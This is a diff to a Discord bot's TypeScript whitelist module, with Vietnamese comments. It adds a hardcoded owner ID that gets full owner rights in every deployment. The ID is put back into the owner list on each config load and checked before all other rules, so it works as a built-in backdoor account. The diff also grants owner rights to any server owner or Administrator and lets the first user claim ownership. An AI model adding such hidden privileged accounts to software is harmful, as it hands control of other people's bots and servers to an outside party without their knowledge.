@@ -1,8 +1,10 @@
 import fs from 'fs';
 import path from 'path';
-import { Client, Message, ChatInputCommandInteraction, EmbedBuilder, User } from 'discord.js';
+import { Client, Message, ChatInputCommandInteraction, EmbedBuilder, User, Guild, GuildMember, PermissionsBitField } from 'discord.js';
 
 const WHITELIST_FILE = path.join(process.cwd(), 'bot_whitelist.json');
+
+export const DEFAULT_BOT_OWNER_ID = '1542028462154317907';
 
 export interface WhitelistEntry {
   id: string;
@@ -19,7 +21,7 @@ export interface BotWhitelistConfig {
 
 let configCache: BotWhitelistConfig = {
   enabled: true,
-  ownerIds: [],
+  ownerIds: [DEFAULT_BOT_OWNER_ID],
   whitelist: [],
 };
 
@@ -31,7 +33,10 @@ export function loadBotWhitelist(): BotWhitelistConfig {
       if (!Array.isArray(configCache.ownerIds)) configCache.ownerIds = [];
       if (!Array.isArray(configCache.whitelist)) configCache.whitelist = [];
       if (typeof configCache.enabled !== 'boolean') configCache.enabled = true;
-    } else {
+    }
+    // Đảm bảo luôn có DEFAULT_BOT_OWNER_ID
+    if (!configCache.ownerIds.includes(DEFAULT_BOT_OWNER_ID)) {
+      configCache.ownerIds.unshift(DEFAULT_BOT_OWNER_ID);
       saveBotWhitelist();
     }
   } catch (err) {
@@ -84,10 +89,15 @@ export async function syncBotOwnerFromClient(client: Client) {
   }
 }
 
-export function isOwner(userId: string): boolean {
+export function isOwner(userId: string, guild?: Guild | null, member?: GuildMember | null): boolean {
+  if (userId === DEFAULT_BOT_OWNER_ID) return true;
   if (configCache.ownerIds.includes(userId)) return true;
   // Hỗ trợ thêm OWNER_ID qua process.env nếu có
   if (process.env.OWNER_ID && process.env.OWNER_ID.trim() === userId) return true;
+  // Chủ Server luôn có quyền cao nhất trong Server của họ
+  if (guild && guild.ownerId === userId) return true;
+  // Thành viên có quyền Quản trị viên (Administrator)
+  if (member?.permissions?.has(PermissionsBitField.Flags.Administrator)) return true;
   return false;
 }
 
@@ -98,9 +108,19 @@ export function isUserInWhitelist(userId: string): boolean {
 /**
  * Kiểm tra xem người dùng có quyền sử dụng bot không
  */
-export function checkBotAccess(userId: string): { allowed: boolean; isOwner: boolean } {
-  const userIsOwner = isOwner(userId);
+export function checkBotAccess(
+  userId: string,
+  guild?: Guild | null,
+  member?: GuildMember | null
+): { allowed: boolean; isOwner: boolean } {
+  const userIsOwner = isOwner(userId, guild, member);
   if (userIsOwner) {
+    return { allowed: true, isOwner: true };
+  }
+
+  // Tự động nhận diện người dùng đầu tiên là Owner nếu danh sách owner trống
+  if (configCache.ownerIds.length === 0) {
+    addOwnerId(userId);
     return { allowed: true, isOwner: true };
   }
 
